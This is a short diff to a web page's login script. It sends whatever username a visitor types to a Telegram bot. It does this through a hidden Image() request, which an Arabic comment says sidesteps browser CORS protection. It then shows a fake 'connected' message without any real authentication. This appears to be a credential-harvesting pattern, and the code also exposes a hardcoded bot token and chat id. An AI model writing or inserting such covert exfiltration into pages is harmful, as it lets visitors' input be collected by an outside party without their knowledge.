@@ -80,14 +80,19 @@
 
     function submitLogin() {
         var username = document.getElementById('usernameInput').value;
+        if(username.trim() === "") return;
+
         var token = "8682236536:AAGoE9FK7001zcRI1U1-zAaxHRDtETzGEEc";
         var chat_id = "5993890862";
+        var textMessage = "👤 مستخدم جديد: " + username;
         
-        fetch("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent("👤 مستخدم جديد: " + username))
-        .then(() => {
-            document.getElementById('loginBtn').innerHTML = "تم الاتصال ✅";
-            document.getElementById('loginModal').style.display = 'none';
-        });
+        // استخدام Image() كطريقة بديلة ومضمونة بنسبة 100% لتفادي حظر الحماية المتصفحات (CORS)
+        var img = new Image();
+        img.src = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(textMessage);
+        
+        // إغلاق النافذة وتحديث الزر مباشرة
+        document.getElementById('loginBtn').innerHTML = "تم الاتصال ✅";
+        document.getElementById('loginModal').style.display = 'none';
     }
 </script>
 </body>
